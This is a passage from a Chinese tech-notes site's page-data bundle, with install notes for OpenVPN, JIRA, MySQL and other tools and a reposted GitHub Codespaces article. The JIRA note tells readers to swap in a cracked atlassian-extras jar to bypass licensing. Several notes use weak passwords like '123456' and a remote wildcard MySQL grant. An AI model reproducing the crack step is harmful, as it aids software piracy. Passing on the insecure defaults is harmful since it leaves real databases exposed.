openvpn",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/297499/",categories:["软件使用","vpn"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/11.vpn/02.%E5%85%B6%E4%BB%96/03.linux%20%E8%BF%9E%E6%8E%A5%20openvpn.html",relativePath:"08.软件使用/11.vpn/02.其他/03.linux 连接 openvpn.md",key:"v-81c1fdb4",path:"/pages/297499/",headersStr:null,content:"openvpn \\\n--daemon \\\n--cd /etc/openvpn \\\n--config client.ovpn \\\n--auth-user-pass /etc/openvpn/passwd \\\n--log-append /var/log/openvpn.log\n\n\n1\n2\n3\n4\n5\n6\n\n\n命令参数说明：\n\n * daemon # 后台运行\n * cd # 配置文件目录路径\n * config # 配置文件名称\n * auth-user-pass # 指定账号密码文件\n * log-append # 日志文件",normalizedContent:"openvpn \\\n--daemon \\\n--cd /etc/openvpn \\\n--config client.ovpn \\\n--auth-user-pass /etc/openvpn/passwd \\\n--log-append /var/log/openvpn.log\n\n\n1\n2\n3\n4\n5\n6\n\n\n命令参数说明：\n\n * daemon # 后台运行\n * cd # 配置文件目录路径\n * config # 配置文件名称\n * auth-user-pass # 指定账号密码文件\n * log-append # 日志文件",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"JIRA安装记录",frontmatter:{title:"JIRA安装记录",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/1af550/",categories:["软件使用","安装记录"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/12.%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/03.JIRA%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95.html",relativePath:"08.软件使用/12.安装记录/03.JIRA安装记录.md",key:"v-bddc04de",path:"/pages/1af550/",headers:[{level:2,title:"2.1. 安装mysql",slug:"_2-1-安装mysql",normalizedTitle:"2.1. 安装mysql",charIndex:110},{level:2,title:"2.2. 初始化",slug:"_2-2-初始化",normalizedTitle:"2.2. 初始化",charIndex:171},{level:2,title:"2.3. 配置mysql",slug:"_2-3-配置mysql",normalizedTitle:"2.3. 配置mysql",charIndex:573},{level:2,title:"2.4. 设置JIRA用户和数据库",slug:"_2-4-设置jira用户和数据库",normalizedTitle:"2.4. 设置jira用户和数据库",charIndex:989}],headersStr:"2.1. 安装mysql 2.2. 初始化 2.3. 配置mysql 2.4. 设置JIRA用户和数据库",content:"# 1. 安装java\n\n 1. 安装\n\napt-get install openjdk-8-jdk\n\n\n1\n\n 2. 查看是否安装成功\n\njava -version\n\n\n1\n\n\n\n\n\n# 2. 安装Mysql\n\n\n# 2.1. 安装mysql\n\napt install mysql-server mysql-client\n\n\n1\n\n\n\n# 2.2. 初始化\n\n 1. 查看默认用户和密码\n\ncat /etc/mysql/debian.cnf\n\n\n1\n\n\n\n\n 2. 使用默认用户和密码登录mysql\n\nmysql -u*** -p***\n\n\n1\n\n\n\n\n 3. 设置root用户和密码\n\nuse mysql;         \n\nupdate mysql.user set authentication_string=password('123456') where user='root' and Host ='localhost'; \n\nupdate user set  plugin=\"mysql_native_password\";     \n\nflush privileges;\n\nquit; \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 4. 测试root用户登录\n\nmysql -uroot -p123456\n\n\n1\n\n\n\n\n\n# 2.3. 配置mysql\n\n 1. 修改配置文件\n\nvim  /etc/mysql/mysql.conf.d/mysqld.cnf\n\n\n1\n\n\n在最下面增加如下内容\n\ndefault-storage-engine=INNODB\ncharacter_set_server=utf8mb4\ninnodb_default_row_format=DYNAMIC\ninnodb_file_format=Barracuda\ninnodb_log_file_size=2G\nsql_mode=ONLY_FULL_GROUP_BY,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION\n\n\n1\n2\n3\n4\n5\n6\n\n 2. 重启mysql\n\nservice mysql restart\n\n\n1\n\n\n\n# 2.4. 设置JIRA用户和数据库\n\n 1. 创建数据库\n\nmysql -uroot -p123456\nmysql>use mysql;\nmysql> CREATE DATABASE jira CHARACTER SET utf8mb4 COLLATE utf8mb4_bin;\n\n\n1\n2\n3\n\n\n2.1. MySQL5.7.0-5.7.5版本配置权限如下:\n\nmysql> GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER,INDEX on <JIRADB>.* TO 'jira'@'%' IDENTIFIED BY 'dqz123456';\nmysql> flush privileges;\n\n\n1\n2\n\n\n2.2 MySQL5.7.6+版本配置权限如下\n\nmysql> GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,REFERENCES,ALTER,INDEX on jira.* TO 'jira'@'%' IDENTIFIED BY 'dqz123456';\nmysql> flush privileges;\n\n\n1\n2\n\n\n\n# 3. 安装JIRA\n\n下载地址: https://www.atlassian.com/zh/software/jira/download/data-center JIRA8.17.1可以完美激活，其他版本不确定。 选择Linux 64 Bit Installer\n\n 1. 赋权并安装\n\nchmod +x atlassian-jira-software-8.17.1-x64.bin \n./atlassian-jira-software-8.17.1-x64.bin\n\n\n1\n2\n\n\n安装时，会有停下来，让选择的选项 分别选择 y,o,1,i,y\n\n 2. 关闭JIRA\n\nservice jira stop\n\n\n1\n\n 3. 默认为8080，可修改端口为其他\n\nvi /opt/atlassian/jira/conf/server.xml\n\n\n1\n\n\n\n\n进入/opt/atlassian/jira/atlassian-jira/WEB-INF/lib/，将atlassian-extras-3.x.jar备份，删除掉原先的\n\n下载mysql 驱动文件 mysql-connect-xx.jar : https://downloads.mysql.com/archives/c-j/\n\n将MySQL驱动文件和破解包\n\natlassian-extras-3.2.jar\n\n放入到/opt/atlassian/jira/atlassian-jira/WEB-INF/lib/中 4. 启动JIRA\n\n/etc/init.d/jira start\n\n\n1\n\n\n\n# 4. 配置JIRA\n\n因为我们没有正式的license，所以需要我们在jira官网注册一个账号，然后利用这个账号申请一个可以试用30天的license，点击生成jira许可证。如下 自动跳转到刚才填写KEY的界面，会自动将许可证填入进去，点击下一步 其实我们已经破解了在前面复制atlassian-extras-3.1.2.jar到/opt/atlassian/jira/atlassian-jira/WEB-INF/lib/目录下时，再次启动jira时就已经破解了 我们现在登陆到jira中查看授权信息，如下\n\n参考：https://www.dqzboy.com/246.html",normalizedContent:"# 1. 安装java\n\n 1. 安装\n\napt-get install openjdk-8-jdk\n\n\n1\n\n 2. 查看是否安装成功\n\njava -version\n\n\n1\n\n\n\n\n\n# 2. 安装mysql\n\n\n# 2.1. 安装mysql\n\napt install mysql-server mysql-client\n\n\n1\n\n\n\n# 2.2. 初始化\n\n 1. 查看默认用户和密码\n\ncat /etc/mysql/debian.cnf\n\n\n1\n\n\n\n\n 2. 使用默认用户和密码登录mysql\n\nmysql -u*** -p***\n\n\n1\n\n\n\n\n 3. 设置root用户和密码\n\nuse mysql;         \n\nupdate mysql.user set authentication_string=password('123456') where user='root' and host ='localhost'; \n\nupdate user set  plugin=\"mysql_native_password\";     \n\nflush privileges;\n\nquit; \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 4. 测试root用户登录\n\nmysql -uroot -p123456\n\n\n1\n\n\n\n\n\n# 2.3. 配置mysql\n\n 1. 修改配置文件\n\nvim  /etc/mysql/mysql.conf.d/mysqld.cnf\n\n\n1\n\n\n在最下面增加如下内容\n\ndefault-storage-engine=innodb\ncharacter_set_server=utf8mb4\ninnodb_default_row_format=dynamic\ninnodb_file_format=barracuda\ninnodb_log_file_size=2g\nsql_mode=only_full_group_by,no_zero_in_date,no_zero_date,error_for_division_by_zero,no_auto_create_user,no_engine_substitution\n\n\n1\n2\n3\n4\n5\n6\n\n 2. 重启mysql\n\nservice mysql restart\n\n\n1\n\n\n\n# 2.4. 设置jira用户和数据库\n\n 1. 创建数据库\n\nmysql -uroot -p123456\nmysql>use mysql;\nmysql> create database jira character set utf8mb4 collate utf8mb4_bin;\n\n\n1\n2\n3\n\n\n2.1. mysql5.7.0-5.7.5版本配置权限如下:\n\nmysql> grant select,insert,update,delete,create,drop,alter,index on <jiradb>.* to 'jira'@'%' identified by 'dqz123456';\nmysql> flush privileges;\n\n\n1\n2\n\n\n2.2 mysql5.7.6+版本配置权限如下\n\nmysql> grant select,insert,update,delete,create,drop,references,alter,index on jira.* to 'jira'@'%' identified by 'dqz123456';\nmysql> flush privileges;\n\n\n1\n2\n\n\n\n# 3. 安装jira\n\n下载地址: https://www.atlassian.com/zh/software/jira/download/data-center jira8.17.1可以完美激活，其他版本不确定。 选择linux 64 bit installer\n\n 1. 赋权并安装\n\nchmod +x atlassian-jira-software-8.17.1-x64.bin \n./atlassian-jira-software-8.17.1-x64.bin\n\n\n1\n2\n\n\n安装时，会有停下来，让选择的选项 分别选择 y,o,1,i,y\n\n 2. 关闭jira\n\nservice jira stop\n\n\n1\n\n 3. 默认为8080，可修改端口为其他\n\nvi /opt/atlassian/jira/conf/server.xml\n\n\n1\n\n\n\n\n进入/opt/atlassian/jira/atlassian-jira/web-inf/lib/，将atlassian-extras-3.x.jar备份，删除掉原先的\n\n下载mysql 驱动文件 mysql-connect-xx.jar : https://downloads.mysql.com/archives/c-j/\n\n将mysql驱动文件和破解包\n\natlassian-extras-3.2.jar\n\n放入到/opt/atlassian/jira/atlassian-jira/web-inf/lib/中 4. 启动jira\n\n/etc/init.d/jira start\n\n\n1\n\n\n\n# 4. 配置jira\n\n因为我们没有正式的license，所以需要我们在jira官网注册一个账号，然后利用这个账号申请一个可以试用30天的license，点击生成jira许可证。如下 自动跳转到刚才填写key的界面，会自动将许可证填入进去，点击下一步 其实我们已经破解了在前面复制atlassian-extras-3.1.2.jar到/opt/atlassian/jira/atlassian-jira/web-inf/lib/目录下时，再次启动jira时就已经破解了 我们现在登陆到jira中查看授权信息，如下\n\n参考：https://www.dqzboy.com/246.html",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"docker部署nexus3",frontmatter:{title:"docker部署nexus3",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/206332/",categories:["软件使用","安装记录"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/12.%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/03.docker%E9%83%A8%E7%BD%B2nexus3.html",relativePath:"08.软件使用/12.安装记录/03.docker部署nexus3.md",key:"v-7b783ab0",path:"/pages/206332/",headersStr:null,content:"https://hub.docker.com/r/sonatype/nexus3/",normalizedContent:"https://hub.docker.com/r/sonatype/nexus3/",charsets:{},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"docker部署artifactory",frontmatter:{title:"docker部署artifactory",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/2519a7/",categories:["软件使用","安装记录"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/12.%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/04.docker%E9%83%A8%E7%BD%B2artifactory.html",relativePath:"08.软件使用/12.安装记录/04.docker部署artifactory.md",key:"v-19700a7a",path:"/pages/2519a7/",headersStr:null,content:"https://www.jfrog.com/confluence/display/JFROG/Installing+Artifactory#114759846aa77ee5734e34d7b8d6fba728e7f646f",normalizedContent:"https://www.jfrog.com/confluence/display/jfrog/installing+artifactory#114759846aa77ee5734e34d7b8d6fba728e7f646f",charsets:{},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"Linux mysql 安装",frontmatter:{title:"Linux mysql 安装",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/18b7d1/",categories:["软件使用","安装记录"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/12.%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/05.Linux%20mysql%20%E5%AE%89%E8%A3%85.html",relativePath:"08.软件使用/12.安装记录/05.Linux mysql 安装.md",key:"v-62572fda",path:"/pages/18b7d1/",headers:[{level:2,title:"1. 安装mysql",slug:"_1-安装mysql",normalizedTitle:"1. 安装mysql",charIndex:294},{level:2,title:"2. 初始化",slug:"_2-初始化",normalizedTitle:"2. 初始化",charIndex:353},{level:2,title:"3. 启动和关闭mysql",slug:"_3-启动和关闭mysql",normalizedTitle:"3. 启动和关闭mysql",charIndex:747}],headersStr:"1. 安装mysql 2. 初始化 3. 启动和关闭mysql",content:"# Docker安装\n\n$PWD是一个变量，表示当前所在目录，所以下面的命令配置了路径映射 所以要在你想要放置配置文件和数据文件的地方使用下面的命令\n\ndocker run \\\n--name mysqlserver \\\n-v $PWD/conf:/etc/mysql/conf.d \\\n-v $PWD/logs:/logs \\\n-v $PWD/data:/var/lib/mysql \\\n-e MYSQL_ROOT_PASSWORD=123456 \\\n-p 3306:3306 \\\n-d \\\nmysql:latest\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# apt安装\n\n\n# 1. 安装mysql\n\napt install mysql-server mysql-client\n\n\n1\n\n\n\n# 2. 初始化\n\n 1. 查看默认用户和密码\n\ncat /etc/mysql/debian.cnf\n\n\n1\n\n\n2. 使用默认用户和密码登录mysql\n\nmysql -u*** -p***\n\n\n1\n\n\n3. 设置root用户和密码\n\nuse mysql;         \n\nupdate mysql.user set authentication_string=password('123456') where user='root' and Host ='localhost'; \n\nupdate user set  plugin=\"mysql_native_password\";     \n\nflush privileges;\n\nquit; \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 4. 测试root用户登录\n\nmysql -uroot -p123456\n\n\n1\n\n\n\n\n\n# 3. 启动和关闭mysql\n\n启动mysql：\n\n * 方式一：sudo /etc/init.d/mysql start\n\n * 方式二：sudo service mysql start\n\n停止mysql：\n\n * 方式一：sudo /etc/init.d/mysql stop\n\n * 方式二：sudo service mysql stop\n\n重启mysql：\n\n * 方式一：sudo/etc/init.d/mysql restart\n\n * 方式二：sudo service mysql restart",normalizedContent:"# docker安装\n\n$pwd是一个变量，表示当前所在目录，所以下面的命令配置了路径映射 所以要在你想要放置配置文件和数据文件的地方使用下面的命令\n\ndocker run \\\n--name mysqlserver \\\n-v $pwd/conf:/etc/mysql/conf.d \\\n-v $pwd/logs:/logs \\\n-v $pwd/data:/var/lib/mysql \\\n-e mysql_root_password=123456 \\\n-p 3306:3306 \\\n-d \\\nmysql:latest\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# apt安装\n\n\n# 1. 安装mysql\n\napt install mysql-server mysql-client\n\n\n1\n\n\n\n# 2. 初始化\n\n 1. 查看默认用户和密码\n\ncat /etc/mysql/debian.cnf\n\n\n1\n\n\n2. 使用默认用户和密码登录mysql\n\nmysql -u*** -p***\n\n\n1\n\n\n3. 设置root用户和密码\n\nuse mysql;         \n\nupdate mysql.user set authentication_string=password('123456') where user='root' and host ='localhost'; \n\nupdate user set  plugin=\"mysql_native_password\";     \n\nflush privileges;\n\nquit; \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 4. 测试root用户登录\n\nmysql -uroot -p123456\n\n\n1\n\n\n\n\n\n# 3. 启动和关闭mysql\n\n启动mysql：\n\n * 方式一：sudo /etc/init.d/mysql start\n\n * 方式二：sudo service mysql start\n\n停止mysql：\n\n * 方式一：sudo /etc/init.d/mysql stop\n\n * 方式二：sudo service mysql stop\n\n重启mysql：\n\n * 方式一：sudo/etc/init.d/mysql restart\n\n * 方式二：sudo service mysql restart",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"Mysql 8.0 安装压缩版教程",frontmatter:{title:"Mysql 8.0 安装压缩版教程",date:"2022-04-30T17:00:54.000Z",permalink:"/pages/90b705/",categories:["软件使用","安装记录"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/12.%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/06.Mysql%208.0%20%E5%AE%89%E8%A3%85%E5%8E%8B%E7%BC%A9%E7%89%88%E6%95%99%E7%A8%8B.html",relativePath:"08.软件使用/12.安装记录/06.Mysql 8.0 安装压缩版教程.md",key:"v-6ee16359",path:"/pages/90b705/",headersStr:null,content:"mysql-8.0有两种安装方式 方式1：不配置my.ini就可安装 方式2：配置my.ini进行安装 (这种方式可以自定义设置数据库参数，推荐)\n\n\n# 方式一：\n\n1、运行命令窗口(以管理员方式打开)\n\n2、输入：mysqld --initialize --console，成功的话会生成随机密码，注意记录下生成的密码，第一次进入mysql会用到\n\n3、输入：mysqld --install，提示成功安装mysql服务。若提示 The service already exists!，说明之前安装过，使用 mysqld -remove MySQL 命令先卸载它。\n\n4、输入：net start mysql，启动mysql服务\n\n5、输入：mysql -uroot -p，然后输入上面生成的密码，进入mysql欢迎界面\n\n6、修改root密码，输入：alter user root@localhost identified by '新密码';(sql语句一般要以分号结尾)\n\n\n# 方式二：\n\n1、在mysql-8.0.19-win64文件夹下新建my.ini文件，其中#开头表示注释，可自定义设置某些参数，内容如下\n\n[mysqld]\n# 主库和从库需要不一致\nserver-id=1\nlog-bin=mysql-bin\n# 需要同步的数据库\n#binlog-do-db=test\n# 不需要同步的数据库\n#binlog-ignore-db=mysql\n# 设置3306端口\nport=3306\n# 设置mysql的安装目录\nbasedir=D:\\Windows\\mysql-8.0.19-winx64\n# 设置mysql数据库的数据的存放目录\ndatadir=D:\\Windows\\mysql-8.0.19-winx64\\Data\n# 允许最大连接数\nmax_connections=200\n# 允许连接失败的次数。\nmax_connect_errors=10\n# 服务端使用的字符集默认为UTF8\ncharacter-set-server=utf8\n# 创建新表时将使用的默认存储引擎\ndefault-storage-engine=INNODB\n#插件认证方式caching_sha2_password和mysql_native_password\ndefault_authentication_plugin=mysql_native_password\n[mysql]\n# 设置mysql客户端默认字符集\ndefault-character-set=utf8\n[client]\n# 设置mysql客户端连接服务端时默认使用的端口\nport=3306\ndefault-character-set=utf8\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n2、运行命令窗口(以管理员方式打开)\n\n3、输入：mysqld --initialize --user=mysql --console，成功的话会生成随机密码，注意记录下生成的密码，第一次进入mysql会用到\n\n4、输入：mysqld --install MySQL --defaults-file=\"D:\\Windows\\mysql-8.0.19-winx64\\my.ini\"，其中MySQL是服务名\n\n5、输入：net start mysql，启动mysql服务\n\n6、输入：mysql -uroot -p，然后输入上面生成的密码，进入mysql欢迎界面\n\n7、修改root密码，输入：alter user root@localhost identified by '新密码';(sql语句一般要以分号结尾)\n\n\n# 卸载\n\n1、停止mysql服务，可通过命令行停止，输入：net stop mysql; 还可以通过右键->计算机->管理->服务和应用程序->服务，找到MySQL，右键停止。\n\n2、卸载mysql服务，命令行输入sc delete mysql 或 mysqld -remove MySQL\n\n2、运行注册表，win+R，输入regedit，打开注册表。\n\n删除 HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Eventlog\\Application\\MySQLD Service文件夹\n\n删除 HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet002\\Services\\Eventlog\\Application\\MySQLD Service文件夹\n\n删除 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Eventlog\\Application\\MySQLD Service的文件夹\n\n以上有可能一个或多个，都删掉即可\n\n3、命令行窗口输入：sc delete mysql 提示删除成功！\n\n4、清空安装mysql路径的文件夹即可。",normalizedContent:"mysql-8.0有两种安装方式 方式1：不配置my.ini就可安装 方式2：配置my.ini进行安装 (这种方式可以自定义设置数据库参数，推荐)\n\n\n# 方式一：\n\n1、运行命令窗口(以管理员方式打开)\n\n2、输入：mysqld --initialize --console，成功的话会生成随机密码，注意记录下生成的密码，第一次进入mysql会用到\n\n3、输入：mysqld --install，提示成功安装mysql服务。若提示 the service already exists!，说明之前安装过，使用 mysqld -remove mysql 命令先卸载它。\n\n4、输入：net start mysql，启动mysql服务\n\n5、输入：mysql -uroot -p，然后输入上面生成的密码，进入mysql欢迎界面\n\n6、修改root密码，输入：alter user root@localhost identified by '新密码';(sql语句一般要以分号结尾)\n\n\n# 方式二：\n\n1、在mysql-8.0.19-win64文件夹下新建my.ini文件，其中#开头表示注释，可自定义设置某些参数，内容如下\n\n[mysqld]\n# 主库和从库需要不一致\nserver-id=1\nlog-bin=mysql-bin\n# 需要同步的数据库\n#binlog-do-db=test\n# 不需要同步的数据库\n#binlog-ignore-db=mysql\n# 设置3306端口\nport=3306\n# 设置mysql的安装目录\nbasedir=d:\\windows\\mysql-8.0.19-winx64\n# 设置mysql数据库的数据的存放目录\ndatadir=d:\\windows\\mysql-8.0.19-winx64\\data\n# 允许最大连接数\nmax_connections=200\n# 允许连接失败的次数。\nmax_connect_errors=10\n# 服务端使用的字符集默认为utf8\ncharacter-set-server=utf8\n# 创建新表时将使用的默认存储引擎\ndefault-storage-engine=innodb\n#插件认证方式caching_sha2_password和mysql_native_password\ndefault_authentication_plugin=mysql_native_password\n[mysql]\n# 设置mysql客户端默认字符集\ndefault-character-set=utf8\n[client]\n# 设置mysql客户端连接服务端时默认使用的端口\nport=3306\ndefault-character-set=utf8\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n2、运行命令窗口(以管理员方式打开)\n\n3、输入：mysqld --initialize --user=mysql --console，成功的话会生成随机密码，注意记录下生成的密码，第一次进入mysql会用到\n\n4、输入：mysqld --install mysql --defaults-file=\"d:\\windows\\mysql-8.0.19-winx64\\my.ini\"，其中mysql是服务名\n\n5、输入：net start mysql，启动mysql服务\n\n6、输入：mysql -uroot -p，然后输入上面生成的密码，进入mysql欢迎界面\n\n7、修改root密码，输入：alter user root@localhost identified by '新密码';(sql语句一般要以分号结尾)\n\n\n# 卸载\n\n1、停止mysql服务，可通过命令行停止，输入：net stop mysql; 还可以通过右键->计算机->管理->服务和应用程序->服务，找到mysql，右键停止。\n\n2、卸载mysql服务，命令行输入sc delete mysql 或 mysqld -remove mysql\n\n2、运行注册表，win+r，输入regedit，打开注册表。\n\n删除 hkey_local_machine\\system\\controlset001\\services\\eventlog\\application\\mysqld service文件夹\n\n删除 hkey_local_machine\\system\\controlset002\\services\\eventlog\\application\\mysqld service文件夹\n\n删除 hkey_local_machine\\system\\currentcontrolset\\services\\eventlog\\application\\mysqld service的文件夹\n\n以上有可能一个或多个，都删掉即可\n\n3、命令行窗口输入：sc delete mysql 提示删除成功！\n\n4、清空安装mysql路径的文件夹即可。",charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"edge浏览器页面强制深色模式",frontmatter:{title:"edge浏览器页面强制深色模式",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/291c74/",categories:["软件使用"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/13.%E5%85%B6%E4%BB%96/01.edge%E6%B5%8F%E8%A7%88%E5%99%A8%E9%A1%B5%E9%9D%A2%E5%BC%BA%E5%88%B6%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F.html",relativePath:"08.软件使用/13.其他/01.edge浏览器页面强制深色模式.md",key:"v-6dd69107",path:"/pages/291c74/",headersStr:null,content:"# 方法1\n\n默认情况下 主题设置深色 页面是不会跟着深色的 在输入框输入：edge://flags/#enable-force-dark 然后将设置改成enabled\n\n\n# 方法2\n\n使用扩展 Dark Reader",normalizedContent:"# 方法1\n\n默认情况下 主题设置深色 页面是不会跟着深色的 在输入框输入：edge://flags/#enable-force-dark 然后将设置改成enabled\n\n\n# 方法2\n\n使用扩展 dark reader",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"GitHub 官方出的 Online VSCode 编辑器太香了！",frontmatter:{title:"GitHub 官方出的 Online VSCode 编辑器太香了！",date:"2022-04-25T00:48:54.000Z",permalink:"/pages/c67d85/",categories:["软件使用","其他"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/13.%E5%85%B6%E4%BB%96/02.GitHub%20%E5%AE%98%E6%96%B9%E5%87%BA%E7%9A%84%20Online%20VSCode%20%E7%BC%96%E8%BE%91%E5%99%A8%E5%A4%AA%E9%A6%99%E4%BA%86%EF%BC%81.html",relativePath:"08.软件使用/13.其他/02.GitHub 官方出的 Online VSCode 编辑器太香了！.md",key:"v-7ced20d1",path:"/pages/c67d85/",headersStr:null,content:"> 原标题：GitHub 官方出的 Online VSCode 编辑器太香了！原文地址 www.sohu.com\n\n首先，我们可以打开任何一个 GitHub 仓库\n\n\n\n首先介绍一个非常方便的快捷键，那就是键盘上的 “.” 这个按键，就是“?” 左边那个按键，如图所示：\n\n\n\n这是 GitHub 官方支持的一个快捷键，按一下，这时候就会打开一个叫做 github.dev 的网站，然后后面的后缀和 GitHub 仓库的后缀是一样的，比如说原来的仓库地址是 https://github.com/Gerapy/Gerapy，那么新转到的网站就是 https://github.dev/Gerapy/Gerapy，打开是什么呢？\n\n就是一个在线 VSCode 编辑器，初始化页面如图所示：\n\n\n\n是不是非常方便？\n\n打开之后，我们可以登录自己的 VSCode 账号，这样它就会自动把我们本地 VSCode 的配置、主题、快捷键、插件等统统同步过来，比如这个就是我打开并同步之后的编辑器效果：\n\n\n\n在这里我们是可以查看、修改代码的。\n\n然而，当我打开命令行 Terminal 运行代码的时候，它提示如下了内容：\n\n意思就是，现在 Terminal 还是不可用的状态，如果要使用的话，可以在本地的 VSCode 打开或者使用 CodeSpace。\n\n本地 VSCode 有什么意思呢？我们用这个就是不想用本地 VSCode 的。\n\n等等，CodeSpace 是什么？好像之前听说过？没错，就是之前大肆宣传的 Online VSCode，我之前还申请了内测，但后来也没有什么消息了。\n\n现在终于来了。\n\n好，那我就直接点 Continue Working on... 这个按钮，然后就看到两个选项：\n\n这里我选择了 Create New Codespace，然后它就开始进行一些初始化设置了，右下角就会显示加载提示：\n\n接着，浏览器又新开了一个选项卡，显示了正在设置 codespace，如图所示：\n\n\n\nWow，稍等片刻，我现在似乎见到了一个 “完全体” 的 Online VSCode，Terminal 也完全可以用了，如图所示：\n\n\n\n测试了一下，运行代码、修改代码都完全没有问题。\n\n那能不能修改之后直接把代码 Push 到 GitHub 仓库呢？有没有权限呢？需不需要再配置 SSH 呢？这是个好问题，那我就来验证下吧。\n\n我随便修改了一个文件，比如 .gitignore ，然后试着 add、commit、push 了一下，居然成功了！\n\n\n\n回到仓库看看，果然更新成功了！\n\n舒服了，看来这个 Codespace 不仅仅是把代码 Clone 下来了，而且还做好了很多权限配置，知道我当前账号登录的情况下是可以直接 Push 代码的。\n\n这样以来，我们以后似乎真的很多时候真的不需要本地 VSCode 编辑器了，看代码、写代码、测代码、推代码一应俱全了！",normalizedContent:"> 原标题：github 官方出的 online vscode 编辑器太香了！原文地址 www.sohu.com\n\n首先，我们可以打开任何一个 github 仓库\n\n\n\n首先介绍一个非常方便的快捷键，那就是键盘上的 “.” 这个按键，就是“?” 左边那个按键，如图所示：\n\n\n\n这是 github 官方支持的一个快捷键，按一下，这时候就会打开一个叫做 github.dev 的网站，然后后面的后缀和 github 仓库的后缀是一样的，比如说原来的仓库地址是 https://github.com/gerapy/gerapy，那么新转到的网站就是 https://github.dev/gerapy/gerapy，打开是什么呢？\n\n就是一个在线 vscode 编辑器，初始化页面如图所示：\n\n\n\n是不是非常方便？\n\n打开之后，我们可以登录自己的 vscode 账号，这样它就会自动把我们本地 vscode 的配置、主题、快捷键、插件等统统同步过来，比如这个就是我打开并同步之后的编辑器效果：\n\n\n\n在这里我们是可以查看、修改代码的。\n\n然而，当我打开命令行 terminal 运行代码的时候，它提示如下了内容：\n\n意思就是，现在 terminal 还是不可用的状态，如果要使用的话，可以在本地的 vscode 打开或者使用 codespace。\n\n本地 vscode 有什么意思呢？我们用这个就是不想用本地 vscode 的。\n\n等等，codespace 是什么？好像之前听说过？没错，就是之前大肆宣传的 online vscode，我之前还申请了内测，但后来也没有什么消息了。\n\n现在终于来了。\n\n好，那我就直接点 continue working on... 这个按钮，然后就看到两个选项：\n\n这里我选择了 create new codespace，然后它就开始进行一些初始化设置了，右下角就会显示加载提示：\n\n接着，浏览器又新开了一个选项卡，显示了正在设置 codespace，如图所示：\n\n\n\nwow，稍等片刻，我现在似乎见到了一个 “完全体” 的 online vscode，terminal 也完全可以用了，如图所示：\n\n\n\n测试了一下，运行代码、修改代码都完全没有问题。\n\n那能不能修改之后直接把代码 push 到 github 仓库呢？有没有权限呢？需不需要再配置 ssh 呢？这是个好问题，那我就来验证下吧。\n\n我随便修改了一个文件，比如 .gitignore ，然后试着 add、commit、push 了一下，居然成功了！\n\n\n\n回到仓库看看，果然更新成功了！\n\n舒服了，看来这个 codespace 不仅仅是把代码 clone 下来了，而且还做好了很多权限配置，知道我当前账号登录的情况下是可以直接 push 代码的。\n\n这样以来，我们以后似乎真的很多时候真的不需要本地 vscode 